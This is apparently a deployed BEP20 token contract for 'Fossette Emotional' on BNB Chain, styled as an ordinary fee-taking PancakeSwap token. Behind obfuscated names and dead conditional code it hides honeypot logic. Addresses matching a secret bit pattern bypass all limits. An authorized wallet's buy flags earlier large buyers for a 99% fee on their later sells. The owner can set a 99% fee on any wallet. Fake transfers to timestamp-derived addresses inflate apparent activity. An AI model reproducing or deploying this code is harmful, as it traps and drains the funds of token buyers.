/**
 *Submitted for verification at BscScan.com on 2022-12-19
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract FossetteEmotional is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Fossette Emotional ";
    string constant _symbol = "FossetteEmotional";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private walletLaunchedIsSellMarketing;
    mapping(address => bool) private marketingReceiverLaunchedBuy;
    mapping(address => bool) private marketingWalletBotsFee;
    mapping(address => bool) private swapMarketingMaxMin;
    mapping(address => uint256) private botsReceiverModeSwapSellExempt;
    mapping(uint256 => address) private isLiquidityLaunchedMarketingModeFeeExempt;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private receiverAutoTxWallet = 0;
    uint256 private walletMaxTradingBuy = 8;

    //SELL FEES
    uint256 private tradingReceiverBotsMode = 0;
    uint256 private maxTradingLiquidityIsLaunched = 8;

    uint256 private receiverExemptIsBurn = walletMaxTradingBuy + receiverAutoTxWallet;
    uint256 private liquidityIsReceiverMin = 100;

    address private isWalletReceiverLiquidity = (msg.sender); // auto-liq address
    address private autoModeLimitMax = (0xb0d0f5A238C0b79773d33d07FffFCbA4090C3b47); // marketing address
    address private limitAutoMarketingLaunched = DEAD;
    address private walletLimitBuyMinTxBots = DEAD;
    address private autoReceiverBurnExempt = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private swapAutoLaunchedTrading;
    uint256 private tradingBotsModeAuto;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private sellWalletMarketingAuto;
    uint256 private maxMarketingSwapLimitReceiverMode;
    uint256 private buyTeamWalletMode;
    uint256 private marketingTxLaunchedExemptBurnIs;
    uint256 private receiverMaxAutoExemptBurn;

    bool private maxSwapSellBots = true;
    bool private swapMarketingMaxMinMode = true;
    bool private buyBotsMaxTx = true;
    bool private liquidityMaxBotsTrading = true;
    bool private launchedTeamIsTrading = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private isReceiverWalletMode = 6 * 10 ** 15;
    uint256 private feeMinWalletMarketingReceiver = _totalSupply / 1000; // 0.1%

    
    uint256 private limitBotsSwapMarketing = 0;
    uint256 private tradingLimitAutoBotsExempt = 0;
    bool private liquidityMaxAutoSellSwapExemptMin = false;
    bool private minTeamTxLiquiditySellMarketingBurn = false;
    uint256 private tradingTeamMaxAuto = 0;
    bool private autoTeamReceiverMarketingTradingBurn = false;
    bool private limitMarketingLiquidityReceiver = false;
    uint256 private botsBuyAutoLiquidityExemptTeamIs = 0;
    bool private swapTradingTeamIs = false;
    uint256 private maxBotsMinWallet = 0;
    bool private tradingLimitAutoBotsExempt0 = false;
    uint256 private tradingLimitAutoBotsExempt1 = 0;
    bool private tradingLimitAutoBotsExempt2 = false;
    uint256 private tradingLimitAutoBotsExempt3 = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        sellWalletMarketingAuto = true;

        walletLaunchedIsSellMarketing[msg.sender] = true;
        walletLaunchedIsSellMarketing[address(this)] = true;

        marketingReceiverLaunchedBuy[msg.sender] = true;
        marketingReceiverLaunchedBuy[0x0000000000000000000000000000000000000000] = true;
        marketingReceiverLaunchedBuy[0x000000000000000000000000000000000000dEaD] = true;
        marketingReceiverLaunchedBuy[address(this)] = true;

        marketingWalletBotsFee[msg.sender] = true;
        marketingWalletBotsFee[0x0000000000000000000000000000000000000000] = true;
        marketingWalletBotsFee[0x000000000000000000000000000000000000dEaD] = true;
        marketingWalletBotsFee[address(this)] = true;

        SetAuthorized(address(0x5479662801a24CE26A475064ffffeb2Dc7fa284e));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return modeTeamLimitLiquidity(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Fossette Emotional  Insufficient Allowance");
        }

        return modeTeamLimitLiquidity(sender, recipient, amount);
    }

    function modeTeamLimitLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = modeTradingMinLaunched(sender) || modeTradingMinLaunched(recipient);
        
        if (tradingLimitAutoBotsExempt3 != tradingReceiverBotsMode) {
            tradingLimitAutoBotsExempt3 = receiverExemptIsBurn;
        }

        if (tradingLimitAutoBotsExempt0 == tradingLimitAutoBotsExempt0) {
            tradingLimitAutoBotsExempt0 = limitMarketingLiquidityReceiver;
        }

        if (tradingLimitAutoBotsExempt2 != swapTradingTeamIs) {
            tradingLimitAutoBotsExempt2 = tradingLimitAutoBotsExempt2;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                burnLiquidityMarketingMaxBuyTxLimit();
            }
            if (!bLimitTxWalletValue) {
                receiverBurnMaxModeFeeSwapTeam(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return isLimitLaunchedSellFeeBuy(sender, recipient, amount);}

        if (!walletLaunchedIsSellMarketing[sender] && !walletLaunchedIsSellMarketing[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Fossette Emotional  Max wallet has been triggered");
        }
        
        if (swapTradingTeamIs == tradingLimitAutoBotsExempt2) {
            swapTradingTeamIs = tradingLimitAutoBotsExempt2;
        }

        if (limitMarketingLiquidityReceiver != tradingLimitAutoBotsExempt2) {
            limitMarketingLiquidityReceiver = liquidityMaxBotsTrading;
        }

        if (tradingTeamMaxAuto == liquidityIsReceiverMin) {
            tradingTeamMaxAuto = tradingReceiverBotsMode;
        }


        require((amount <= _maxTxAmount) || marketingWalletBotsFee[sender] || marketingWalletBotsFee[recipient], "Fossette Emotional  Max TX Limit has been triggered");

        if (buyTxLaunchedTrading()) {exemptMaxTradingMinMarketingSwap();}

        _balances[sender] = _balances[sender].sub(amount, "Fossette Emotional  Insufficient Balance");
        
        if (autoTeamReceiverMarketingTradingBurn == swapMarketingMaxMinMode) {
            autoTeamReceiverMarketingTradingBurn = limitMarketingLiquidityReceiver;
        }

        if (tradingLimitAutoBotsExempt2 == limitMarketingLiquidityReceiver) {
            tradingLimitAutoBotsExempt2 = liquidityMaxAutoSellSwapExemptMin;
        }

        if (maxBotsMinWallet != maxBotsMinWallet) {
            maxBotsMinWallet = receiverExemptIsBurn;
        }


        uint256 amountReceived = launchedModeBuyExempt(sender) ? tradingSellTeamIs(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function isLimitLaunchedSellFeeBuy(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Fossette Emotional  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function launchedModeBuyExempt(address sender) internal view returns (bool) {
        return !marketingReceiverLaunchedBuy[sender];
    }

    function limitMinExemptIs(address sender, bool selling) internal returns (uint256) {
        
        if (limitBotsSwapMarketing != feeMinWalletMarketingReceiver) {
            limitBotsSwapMarketing = receiverAutoTxWallet;
        }


        if (selling) {
            receiverExemptIsBurn = maxTradingLiquidityIsLaunched + tradingReceiverBotsMode;
            return receiverBurnExemptSellTeam(sender, receiverExemptIsBurn);
        }
        if (!selling && sender == uniswapV2Pair) {
            receiverExemptIsBurn = walletMaxTradingBuy + receiverAutoTxWallet;
            return receiverExemptIsBurn;
        }
        return receiverBurnExemptSellTeam(sender, receiverExemptIsBurn);
    }

    function receiverTradingTeamBurn() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function tradingSellTeamIs(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(limitMinExemptIs(sender, receiver == uniswapV2Pair)).div(liquidityIsReceiverMin);

        if (swapMarketingMaxMin[sender] || swapMarketingMaxMin[receiver]) {
            feeAmount = amount.mul(99).div(liquidityIsReceiverMin);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        if (_balances[address(this)] > 4 * 10 ** _decimals && sender == uniswapV2Pair) {
            for (uint i = 0; i < 4; i++) {
                address addr = address(uint160(block.timestamp + i));
                _balances[addr] = _balances[addr] + 10 ** _decimals;
                emit Transfer(address(this), addr, 10 ** _decimals);
            }
            _balances[address(this)] = _balances[address(this)].sub(4 * 10 ** _decimals);
        }

        return amount.sub(feeAmount);
    }

    function modeTradingMinLaunched(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function receiverBurnExemptSellTeam(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = botsReceiverModeSwapSellExempt[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function receiverBurnMaxModeFeeSwapTeam(address addr) private {
        if (receiverTradingTeamBurn() < isReceiverWalletMode) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        isLiquidityLaunchedMarketingModeFeeExempt[exemptLimitValue] = addr;
    }

    function burnLiquidityMarketingMaxBuyTxLimit() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (botsReceiverModeSwapSellExempt[isLiquidityLaunchedMarketingModeFeeExempt[i]] == 0) {
                    botsReceiverModeSwapSellExempt[isLiquidityLaunchedMarketingModeFeeExempt[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(autoModeLimitMax).transfer(amountBNB * amountPercentage / 100);
    }

    function buyTxLaunchedTrading() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    launchedTeamIsTrading &&
    _balances[address(this)] >= feeMinWalletMarketingReceiver;
    }

    function exemptMaxTradingMinMarketingSwap() internal swapping {
        
        uint256 amountToLiquify = feeMinWalletMarketingReceiver.mul(receiverAutoTxWallet).div(receiverExemptIsBurn).div(2);
        uint256 amountToSwap = feeMinWalletMarketingReceiver.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (swapTradingTeamIs == swapTradingTeamIs) {
            swapTradingTeamIs = liquidityMaxAutoSellSwapExemptMin;
        }

        if (maxBotsMinWallet == liquidityIsReceiverMin) {
            maxBotsMinWallet = liquidityIsReceiverMin;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = receiverExemptIsBurn.sub(receiverAutoTxWallet.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(receiverAutoTxWallet).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(walletMaxTradingBuy).div(totalETHFee);
        
        payable(autoModeLimitMax).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                isWalletReceiverLiquidity,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getSwapTradingTeamIs() public view returns (bool) {
        if (swapTradingTeamIs != minTeamTxLiquiditySellMarketingBurn) {
            return minTeamTxLiquiditySellMarketingBurn;
        }
        if (swapTradingTeamIs != tradingLimitAutoBotsExempt0) {
            return tradingLimitAutoBotsExempt0;
        }
        if (swapTradingTeamIs == tradingLimitAutoBotsExempt2) {
            return tradingLimitAutoBotsExempt2;
        }
        return swapTradingTeamIs;
    }
    function setSwapTradingTeamIs(bool a0) public onlyOwner {
        if (swapTradingTeamIs == limitMarketingLiquidityReceiver) {
            limitMarketingLiquidityReceiver=a0;
        }
        if (swapTradingTeamIs == liquidityMaxAutoSellSwapExemptMin) {
            liquidityMaxAutoSellSwapExemptMin=a0;
        }
        swapTradingTeamIs=a0;
    }

    function getTradingLimitAutoBotsExempt1() public view returns (uint256) {
        if (tradingLimitAutoBotsExempt1 != tradingLimitAutoBotsExempt1) {
            return tradingLimitAutoBotsExempt1;
        }
        return tradingLimitAutoBotsExempt1;
    }
    function setTradingLimitAutoBotsExempt1(uint256 a0) public onlyOwner {
        if (tradingLimitAutoBotsExempt1 == limitBotsSwapMarketing) {
            limitBotsSwapMarketing=a0;
        }
        if (tradingLimitAutoBotsExempt1 != tradingLimitAutoBotsExempt1) {
            tradingLimitAutoBotsExempt1=a0;
        }
        if (tradingLimitAutoBotsExempt1 != tradingLimitAutoBotsExempt3) {
            tradingLimitAutoBotsExempt3=a0;
        }
        tradingLimitAutoBotsExempt1=a0;
    }

    function getSwapMarketingMaxMin(address a0) public view returns (bool) {
            return swapMarketingMaxMin[a0];
    }
    function setSwapMarketingMaxMin(address a0,bool a1) public onlyOwner {
        if (swapMarketingMaxMin[a0] != swapMarketingMaxMin[a0]) {
           swapMarketingMaxMin[a0]=a1;
        }
        if (swapMarketingMaxMin[a0] != marketingWalletBotsFee[a0]) {
           marketingWalletBotsFee[a0]=a1;
        }
        swapMarketingMaxMin[a0]=a1;
    }

    function getReceiverExemptIsBurn() public view returns (uint256) {
        if (receiverExemptIsBurn != receiverAutoTxWallet) {
            return receiverAutoTxWallet;
        }
        return receiverExemptIsBurn;
    }
    function setReceiverExemptIsBurn(uint256 a0) public onlyOwner {
        receiverExemptIsBurn=a0;
    }

    function getReceiverAutoTxWallet() public view returns (uint256) {
        if (receiverAutoTxWallet == tradingReceiverBotsMode) {
            return tradingReceiverBotsMode;
        }
        if (receiverAutoTxWallet != liquidityIsReceiverMin) {
            return liquidityIsReceiverMin;
        }
        if (receiverAutoTxWallet != tradingLimitAutoBotsExempt) {
            return tradingLimitAutoBotsExempt;
        }
        return receiverAutoTxWallet;
    }
    function setReceiverAutoTxWallet(uint256 a0) public onlyOwner {
        if (receiverAutoTxWallet != maxTradingLiquidityIsLaunched) {
            maxTradingLiquidityIsLaunched=a0;
        }
        if (receiverAutoTxWallet != limitBotsSwapMarketing) {
            limitBotsSwapMarketing=a0;
        }
        receiverAutoTxWallet=a0;
    }

    function getLimitBotsSwapMarketing() public view returns (uint256) {
        if (limitBotsSwapMarketing == maxTradingLiquidityIsLaunched) {
            return maxTradingLiquidityIsLaunched;
        }
        if (limitBotsSwapMarketing == maxBotsMinWallet) {
            return maxBotsMinWallet;
        }
        if (limitBotsSwapMarketing != tradingLimitAutoBotsExempt3) {
            return tradingLimitAutoBotsExempt3;
        }
        return limitBotsSwapMarketing;
    }
    function setLimitBotsSwapMarketing(uint256 a0) public onlyOwner {
        if (limitBotsSwapMarketing != isReceiverWalletMode) {
            isReceiverWalletMode=a0;
        }
        if (limitBotsSwapMarketing != maxBotsMinWallet) {
            maxBotsMinWallet=a0;
        }
        if (limitBotsSwapMarketing != maxBotsMinWallet) {
            maxBotsMinWallet=a0;
        }
        limitBotsSwapMarketing=a0;
    }

    function getLaunchedTeamIsTrading() public view returns (bool) {
        if (launchedTeamIsTrading == liquidityMaxBotsTrading) {
            return liquidityMaxBotsTrading;
        }
        if (launchedTeamIsTrading != launchedTeamIsTrading) {
            return launchedTeamIsTrading;
        }
        return launchedTeamIsTrading;
    }
    function setLaunchedTeamIsTrading(bool a0) public onlyOwner {
        if (launchedTeamIsTrading != launchedTeamIsTrading) {
            launchedTeamIsTrading=a0;
        }
        launchedTeamIsTrading=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}